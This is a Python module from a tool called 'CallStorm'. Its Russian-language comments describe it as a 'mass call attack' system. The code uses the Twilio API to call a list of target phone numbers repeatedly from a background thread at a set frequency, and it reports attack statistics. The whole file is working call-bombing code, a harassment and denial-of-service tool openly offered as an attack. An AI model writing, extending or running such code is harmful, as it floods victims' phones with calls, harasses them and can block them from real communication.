#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Модуль системы звонков CallStorm
Реализует функции массовой атаки звонками
"""

import time
import threading
from twilio.rest import Client
import phonenumbers
from datetime import datetime


class CallSystem:
    """Класс системы звонков"""
    
    def __init__(self, config):
        self.config = config
        self.is_attacking = False
        self.attack_thread = None
        self.call_count = 0
        self.successful_calls = 0
        self.failed_calls = 0
        self.start_time = None
        
        # Инициализация Twilio клиента
        if self.config.twilio_sid and self.config.twilio_token:
            self.client = Client(self.config.twilio_sid, self.config.twilio_token)
        else:
            self.client = None
            print("Предупреждение: Twilio учетные данные не настроены")
    
    def validate_phone_number(self, phone_number):
        """Проверка валидности номера телефона"""
        try:
            parsed = phonenumbers.parse(phone_number, "RU")
            return phonenumbers.is_valid_number(parsed)
        except:
            return False
    
    def make_call(self, to_number):
        """Осуществление звонка на указанный номер"""
        if not self.client:
            print("Ошибка: Twilio клиент не инициализирован")
            return False
        
        try:
            # Проверка валидности номера
            if not self.validate_phone_number(to_number):
                print(f"Невалидный номер телефона: {to_number}")
                return False
            
            # Осуществление звонка через Twilio
            call = self.client.calls.create(
                to=to_number,
                from_=self.config.twilio_phone,
                url="http://demo.twilio.com/docs/voice.xml"  # URL с инструкциями для звонка
            )
            
            print(f"Звонок на номер {to_number} успешно инициирован. SID: {call.sid}")
            return True
            
        except Exception as e:
            print(f"Ошибка при звонке на {to_number}: {e}")
            return False
    
    def attack_cycle(self):
        """Цикл атаки звонками"""
        print("Атака звонками начата...")
        self.start_time = datetime.now()
        
        while self.is_attacking and self.call_count < self.config.duration:
            # Проходим по всем целевым номерам
            for number in self.config.target_numbers:
                if not self.is_attacking:
                    break
                
                # Осуществляем звонок
                if self.make_call(number):
                    self.successful_calls += 1
                else:
                    self.failed_calls += 1
                
                self.call_count += 1
                
                # Проверяем, не превышен ли лимит звонков
                if self.call_count >= self.config.duration:
                    break
                
                # Ждем перед следующим звонком
                time.sleep(self.config.call_frequency)
        
        self.is_attacking = False
        print("Атака звонками завершена.")
    
    def start_attack(self):
        """Запуск атаки звонками"""
        if self.is_attacking:
            print("Атака уже запущена!")
            return
        
        if not self.config.target_numbers:
            print("Ошибка: Не указаны целевые номера для атаки")
            return
        
        self.is_attacking = True
        self.attack_thread = threading.Thread(target=self.attack_cycle)
        self.attack_thread.start()
        print("Атака звонками запущена в отдельном потоке.")
    
    def stop_attack(self):
        """Остановка атаки звонками"""
        if not self.is_attacking:
            print("Атака не запущена!")
            return
        
        self.is_attacking = False
        if self.attack_thread:
            self.attack_thread.join()
        print("Атака звонками остановлена.")
    
    def show_statistics(self):
        """Показ статистики звонков"""
        elapsed_time = 0
        if self.start_time:
            elapsed_time = (datetime.now() - self.start_time).total_seconds()
        
        print("\n===== Статистика атаки =====")
        print(f"Всего звонков: {self.call_count}")
        print(f"Успешных звонков: {self.successful_calls}")
        print(f"Неудачных звонков: {self.failed_calls}")
        print(f"Время атаки: {elapsed_time:.2f} секунд")
        print(f"Состояние: {'Активна' if self.is_attacking else 'Остановлена'}")
        print("=" * 30)